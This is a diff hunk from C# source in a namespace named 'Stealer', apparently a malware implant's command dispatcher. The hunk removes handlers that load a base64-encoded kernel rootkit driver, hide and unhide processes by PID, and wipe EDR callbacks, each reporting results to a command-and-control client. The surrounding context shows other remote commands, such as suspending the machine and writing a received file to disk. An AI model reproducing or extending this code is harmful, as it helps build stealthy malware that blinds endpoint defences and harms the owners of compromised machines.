@@ -207,66 +207,6 @@ namespace Stealer
             {
                 Task.Run(() => SetSuspendState(false, false, false));
             }
-            // ── Rootkit ───────────────────────────────────────────────────────────
-            else if (cmdLower.StartsWith("rootkit_load:"))
-            {
-                // payload: base64-encoded .sys binary
-                string b64sys = cmd.Substring("rootkit_load:".Length);
-                Task.Run(() =>
-                {
-                    try
-                    {
-                        byte[] sysBytes = Convert.FromBase64String(b64sys);
-                        bool ok = RootkitClient.Load(sysBytes, out string errStr);
-                        if (ok)
-                        {
-                            C2Client.SendText("{\"type\":\"rootkit_status\",\"loaded\":true}");
-                        }
-                        else
-                        {
-                            C2Client.SendText("{\"type\":\"rootkit_status\",\"loaded\":false,\"error\":\"" + EscJson(errStr ?? "Unknown load error") + "\"}");
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        C2Client.SendText("{\"type\":\"rootkit_status\",\"loaded\":false,\"error\":\"" + EscJson(ex.Message) + "\"}");
-                    }
-                });
-            }
-            else if (cmdLower == "rootkit_unload")
-            {
-                Task.Run(() =>
-                {
-                    try { RootkitClient.Unload(); } catch { }
-                    C2Client.SendText("{\"type\":\"rootkit_status\",\"loaded\":false}");
-                });
-            }
-            else if (cmdLower == "rootkit_status")
-            {
-                bool loaded = RootkitClient.IsLoaded();
-                C2Client.SendText("{\"type\":\"rootkit_status\",\"loaded\":" + (loaded ? "true" : "false") + "}");
-            }
-            else if (cmdLower.StartsWith("rootkit_hide_proc:"))
-            {
-                if (int.TryParse(cmd.Substring("rootkit_hide_proc:".Length), out int pid))
-                {
-                    bool ok = RootkitClient.HideProcess(pid);
-                    C2Client.SendText("{\"type\":\"rootkit_res\",\"cmd\":\"hide_proc\",\"pid\":" + pid + ",\"ok\":" + (ok ? "true" : "false") + "}");
-                }
-            }
-            else if (cmdLower.StartsWith("rootkit_unhide_proc:"))
-            {
-                if (int.TryParse(cmd.Substring("rootkit_unhide_proc:".Length), out int pid))
-                {
-                    bool ok = RootkitClient.UnhideProcess(pid);
-                    C2Client.SendText("{\"type\":\"rootkit_res\",\"cmd\":\"unhide_proc\",\"pid\":" + pid + ",\"ok\":" + (ok ? "true" : "false") + "}");
-                }
-            }
-            else if (cmdLower == "rootkit_wipe_edr")
-            {
-                bool ok = RootkitClient.WipeCallbacks();
-                C2Client.SendText("{\"type\":\"rootkit_res\",\"cmd\":\"wipe_edr\",\"ok\":" + (ok ? "true" : "false") + "}");
-            }
             // ── Send File to Disk ──────────────────────────────────────────────
             else if (cmdLower.StartsWith("send_file:"))
             {
